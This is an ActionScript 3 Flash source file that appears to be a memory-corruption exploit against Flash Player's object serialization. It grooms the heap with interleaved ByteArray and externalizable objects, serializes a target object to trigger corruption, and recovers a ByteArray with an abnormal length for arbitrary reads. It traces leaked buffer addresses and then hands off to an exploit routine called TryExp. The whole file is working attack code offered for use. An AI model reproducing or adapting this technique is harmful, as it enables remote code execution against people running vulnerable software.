package
{
	import flash.display.Sprite;
	import flash.net.registerClassAlias;
	import flash.utils.ByteArray;
	import flash.utils.Endian;
	import flash.system.Capabilities;
	
	public class externalizable extends Sprite
	{
		//for layout the special memory of vtable
		var obj4 = new MyExt4();
		var obj5 = new MyExt5();
		var obj = new subexternalizable();
		var obj6 = new MyExt6();
		var obj7 = new MyExt7();
		
		static var infiniteBy:MyBy1;
		static var infiniteBy1:MyBy1;
		static var trige:*;
		static var verflag = Capabilities.isDebugger;
		
		static function Throw(arg1:String)
		{
			throw(new Error(arg1));
		}
		
		
		static function Hex(arg1:uint):String
		{
			if(arg1 <= 9)
			{
				return arg1.toString();
			}
			return "0x" + arg1.toString(16);
		}
		
		
		public function externalizable()
		{
			var contents:Array;
			var len:int;
			
			
			var obj = new subexternalizable();
			registerClassAlias("test", subexternalizable);
			//fengshui for layout the special memory
			contents = new Array(60);
			while(len < contents.length)
			{
				contents[len] = new MyBy1(len);
				contents[len+1] = new subexternalizable();
				contents[len+2] = new MyBy1(len+2);
				len = len + 3;
			}
			trige = contents[contents.length - 2 -12];
			var b = new ByteArray();
			b.writeObject(trige);
			
			if(trige["id"] is uint)
			{
				infiniteBy = contents[trige["id"]];
				trace("the length is " + infiniteBy.length);
				
				trace("id is:" + trige["id"].toString(16));
				trace("bufOld is:" + trige["bufOld"].toString(16));
				trace("bufAddr is:" + trige["bufAddr"].toString(16));
				
				var flag:uint = 287454020;
				var timess:uint = 84;
				var i:uint = 0;
				infiniteBy.endian = Endian.LITTLE_ENDIAN;
				
				/*
				infiniteBy.position = trige["bufAddr"]-287454020 - 68;
				var res:uint = infiniteBy.readUnsignedInt();
				trace("infinite read vt" + ":" + res.toString(16))
				
				infiniteBy.position = trige["bufAddr"]-287454020 + 40;
				var res:uint = infiniteBy.readUnsignedInt();
				trace("infinite read vu" + ":" + res.toString(16))
				*/
				
				
				
				
				
				exter32.TryExp(trige);
			}
		}
	}
}